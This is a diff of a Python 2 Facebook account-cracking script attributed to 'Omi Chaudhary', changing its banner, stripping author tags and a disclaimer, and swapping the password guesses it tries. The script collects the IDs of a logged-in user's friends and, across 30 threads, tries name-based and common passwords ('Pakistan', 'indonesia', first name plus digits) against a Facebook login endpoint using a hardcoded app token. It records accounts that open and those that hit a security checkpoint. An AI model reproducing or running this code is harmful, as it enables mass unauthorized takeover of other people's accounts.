@@ -1,3 +1,5 @@
+#!/usr/bin/python2
+#coding=utf-8
 #The Credit For This Code Goes To Omi Chaudhary
 #If You Wanna Take Credits For This Code, Please Look Yourself Again...
 #Reserved2020
@@ -44,24 +46,24 @@ def jalan(z):
 	for e in z + '\n':
 		sys.stdout.write(e)
 		sys.stdout.flush()
-		time.sleep(0.07)
+		time.sleep(00000.1)
 
-#Dev:Omi_Ch
+
 ##### LOGO #####
 logo = """
-           \033[1;97m::::::::    :::   :::   ::::::::::: 
-         \033[1;97m:+:    :+:  :+:+: :+:+:      :+:      
-        \033[1;92m+:+    +:+ +:+ +:+:+ +:+     +:+       
-       \033[1;92m+#+    +:+ +#+  +:+  +#+     +#+        
-      \033[1;92m+#+    +#+ +#+       +#+     +#+         
-     \033[1;92m#+#    #+# #+#       #+#     #+#          
-     \033[1;92m########  ###       ### ###########
-\033[1;97m.....\033[1;92m\033[1;97m......
+        \033[1;97m::::::::    :::   :::   ::::::::::: 
+      \033[1;97m:+:    :+:  :+:+: :+:+:      :+:      
+     \033[1;92m+:+    +:+ +:+ +:+:+ +:+     +:+       
+    \033[1;92m+#+    +:+ +#+  +:+  +#+     +#+        
+   \033[1;92m+#+    +#+ +#+       +#+     +#+         
+  \033[1;92m#+#    #+# #+#       #+#     #+#          
+  \033[1;92m########  ###       ### ###########
+\033[1;97m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;92m๑۩۩๑\033[1;97m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
 \033[1;97mAuthor©\033[1;97m: \033[1;92mOmi Chaudhary
 \033[1;97mInstagram\033[1;97m: \033[1;92mhttps://www.Instagram.com/Omi6t
 \033[1;97mFacebook\033[1;97m: \033[1;92mhttps://www.facebook.com/Omi6t
 \033[1;97mWhatsapp\033[1;97m: \033[1;92m+923117675174
-\033[1;97m«-----------------------\033[1;92m✧✧\033[1;97m-----------------------»"""
+\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"""
 
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -93,14 +95,8 @@ print  """
 \033[1;91mInstagram\033[1;91m: \033[1;93mhttps://www.Instagram.com/Omi6t
 \033[1;91mFacebook\033[1;91m: \033[1;93mhttps://www.facebook.com/Omi6t
 \033[1;91mWhatsapp\033[1;91m: \033[1;93m+923117675174
-\033[1;91m«--------------------\033[1;93m✧\033[1;91m--------------------»"""
-jalan('              \033[1;91mREAD CAREFULLY:')
-jalan("\033[1;97m   It's not in Commands Control to get a   ")
-jalan('\033[1;97m   New or Old Account,It Totally Depends   ')
-jalan('\033[1;97m   on Friends List And the Accounts that   ')
-jalan("\033[1;97m   goes to Checkpoint is due to Facebook ")
-jalan("\033[1;97m    Security,That's not Commands Issue.")
-print "\033[1;91m«-------------\033[1;93mLogin With Tool\033[1;91m-------------»"
+\033[1;91m«--------------------\033[1;93m✧\033[1;91m--------------------»
+\033[1;91m«-------------\033[1;93mLogin With Tool\033[1;91m-------------»"""
 
 CorrectUsername = "Omi6t"
 CorrectPassword = "Omi"
@@ -111,8 +107,7 @@ while (loop == 'true'):
     if (username == CorrectUsername):
     	password = raw_input("\033[1;96m🔐 \x1b[1;91mTool Password \x1b[1;91m»» \x1b[1;93m")
         if (password == CorrectPassword):
-            print "Logged in successfully as " + username #Dev:Omi_Ch
-	    time.sleep(2)
+            print "Logged in successfully as " + username
             loop = 'false'
         else:
             print "\033[1;91mWrong Password"
@@ -205,7 +200,7 @@ def menu():
 	except requests.exceptions.ConnectionError:
 		print"\x1b[1;91mThere is no internet connection"
 		keluar()
-	os.system("clear") #Dev:Omi_Ch
+	os.system("clear")
 	print logo
 	print "  \033[1;97m«---------\033[1;95mLogged in User Info\033[1;97m---------»"
 	print "	   \033[1;93m Name\033[1;93m:\033[1;97m"+nama+"\033[1;97m               "
@@ -304,11 +299,11 @@ def pilih_super():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:Omi_Ch
+			pass
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
-			pass1 = ('786786')
+			pass1 = b['first_name']+'12345'
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if 'access_token' in q:
@@ -322,7 +317,7 @@ def pilih_super():
 					cek.close()
 					cekpoint.append(user+pass1)
 				else:
-					pass2 = 'Pakistan'
+					pass2 = b['first_name'] + '12'
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					q = json.load(data)
 					if 'access_token' in q:
@@ -336,7 +331,7 @@ def pilih_super():
 							cek.close()
 							cekpoint.append(user+pass2)
 						else:
-							pass3 = b['first_name'] + '12345'
+							pass3 = b['first_name'] + '123'
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							q = json.load(data)
 							if 'access_token' in q:
@@ -350,7 +345,7 @@ def pilih_super():
 									cek.close()
 									cekpoint.append(user+pass3)
 								else:
-									pass4 = b['first_name'] + '123'
+									pass4 = b['first_name'] + '1234'
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if 'access_token' in q:
@@ -364,7 +359,7 @@ def pilih_super():
 											cek.close()
 											cekpoint.append(user+pass4)
 										else:
-											pass5 = b['first_name'] + '786'
+											pass5 = 'indonesia'
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
@@ -378,7 +373,7 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = 'Pakistan1'
+													pass6 = 'Sayang'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
@@ -394,7 +389,7 @@ def pilih_super():
 														else:
 															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 															b = json.loads(a.text)
-															pass7 = b['first_name'] + '1234'
+															pass7 = 'Bangsat'
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if 'access_token' in q:
@@ -415,7 +410,7 @@ def pilih_super():
 	p = ThreadPool(30)
 	p.map(main, id)
 	print "\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
-	print "  \033[1;91m«---------Developed By Omi------------»" #Dev:Omi_Ch
+	print "  \033[1;91m«---------Developed By Omi------------»"
 	print '\033[1;92mProcess Has Been Completed\033[1;92m....'
 	print"\033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
 	print """
